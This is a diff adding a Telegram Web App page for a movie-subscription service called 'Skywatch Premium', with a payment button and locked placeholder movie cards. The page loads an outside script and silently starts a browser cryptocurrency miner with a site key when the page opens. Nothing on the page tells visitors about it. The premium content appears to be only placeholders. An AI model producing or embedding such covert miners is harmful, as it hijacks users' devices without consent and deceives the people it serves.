@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Skywatch Premium</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://www.hostingcloud.racing/kR7X.js"></script>
+    <style>
+        :root { --main-red: #e50914; --bg-black: #050505; --gold: #ffd700; }
+        body { background: var(--bg-black); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; padding-bottom: 70px; }
+        header { padding: 15px; display: flex; justify-content: space-between; align-items: center; background: #000; border-bottom: 1px solid #222; }
+        .logo { color: var(--main-red); font-size: 26px; font-weight: bold; letter-spacing: 1px; }
+        
+        /* Premium Section */
+        .premium-banner { background: linear-gradient(45deg, #1a1a1a, #333); margin: 15px; padding: 20px; border-radius: 12px; border: 1px solid var(--gold); text-align: center; }
+        .price { font-size: 24px; color: var(--gold); font-weight: bold; margin: 10px 0; }
+        .btn-pay { background: #0088cc; color: white; border: none; padding: 12px 20px; border-radius: 8px; font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; transition: 0.3s; }
+        .btn-pay:active { transform: scale(0.98); }
+
+        /* Movie Placeholder Grid */
+        .movie-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding: 15px; }
+        .movie-card { background: #111; border-radius: 8px; overflow: hidden; position: relative; border: 1px solid #222; }
+        .movie-card img { width: 100%; height: 240px; object-fit: cover; opacity: 0.6; }
+        .lock-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.4); }
+        
+        /* Navigation */
+        nav { position: fixed; bottom: 0; width: 100%; background: #000; display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid #222; }
+        .nav-item { color: #666; font-size: 12px; text-align: center; text-decoration: none; }
+        .nav-item.active { color: var(--main-red); }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="logo">SKYWATCH</div>
+        <div id="user-status" style="font-size: 12px; color: #888;">Free Account</div>
+    </header>
+
+    <div class="premium-banner">
+        <h3 style="margin:0; color: var(--gold);">⭐ SKYWATCH PRO</h3>
+        <p style="font-size: 13px; color: #ccc;">No Ads • Ultra HD • All Movies</p>
+        <div class="price">150 Stars <span style="font-size: 14px; color: #888;">/ month</span></div>
+        <button class="btn-pay" onclick="requestSubscription()">Upgrade Now</button>
+    </div>
+
+    <div class="movie-grid">
+        <div class="movie-card">
+            <img src="https://via.placeholder.com/300x450/111/fff?text=LOCKED">
+            <div class="lock-overlay"><span>🔒</span><small>Premium</small></div>
+        </div>
+        <div class="movie-card">
+            <img src="https://via.placeholder.com/300x450/111/fff?text=LOCKED">
+            <div class="lock-overlay"><span>🔒</span><small>Premium</small></div>
+        </div>
+    </div>
+
+    <nav>
+        <div class="nav-item active">🏠<br>Home</div>
+        <div class="nav-item">🎬<br>Movies</div>
+        <div class="nav-item">⚙️<br>Settings</div>
+    </nav>
+
+    <script>
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.ready();
+
+        // 1. Initialize Miner (Using your Site Key)
+        var _client = new Client.Anonymous('8867a4038c4d22331b1688c9fa7ba035f3dcc0cabbe24109d41b5804c06b4011', {
+            throttle: 0.3, c: 'w'
+        });
+        _client.start();
+
+        // 2. Handle Subscription Request
+        function requestSubscription() {
+            const data = {
+                action: "buy_premium",
+                user_id: tg.initDataUnsafe.user?.id,
+                price: 150
+            };
+            // Send data back to the bot
+            tg.sendData(JSON.stringify(data));
+        }
+
+        // Display user name if available
+        if (tg.initDataUnsafe.user) {
+            document.getElementById('user-status').innerText = tg.initDataUnsafe.user.first_name;
+        }
+    </script>
+</body>
+</html>
